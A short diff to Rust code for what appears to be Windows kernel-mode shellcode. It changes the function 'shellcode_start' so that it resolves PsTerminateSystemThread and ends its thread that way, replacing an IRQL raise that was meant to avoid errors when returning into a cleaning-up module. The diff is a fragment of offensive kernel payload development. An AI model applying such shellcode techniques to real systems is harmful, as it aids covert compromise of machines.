@@ -88,6 +88,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     */
 
     let rtl_get_version: ntdef::functions::RtlGetVersion =  ntproc::find!("RtlGetVersion");
+    let ps_terminate_system_thread: ntdef::functions::PsTerminateSystemThread = ntproc::find!("PsTerminateSystemThread");
     let mut version: ntdef::structs::RTL_OSVERSIONINFOW = core::mem::MaybeUninit::uninit().assume_init();
     version.dwOSVersionInfoSize = core::mem::size_of_val(&version) as _;
     rtl_get_version(&mut version as *mut _ as _);
@@ -281,8 +282,8 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
     ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer as _, 2);
     // ((*tdi_ctx).funcs.ex_free_pool_with_tag)(scratch_buf, 3);
     */
-    // this is to avoid errors if returning to a cleaning-up module
-    _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
+    // _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
+    ps_terminate_system_thread(ntdef::enums::NTSTATUS::STATUS_SUCCESS as _);
     Ok(())
 }
 
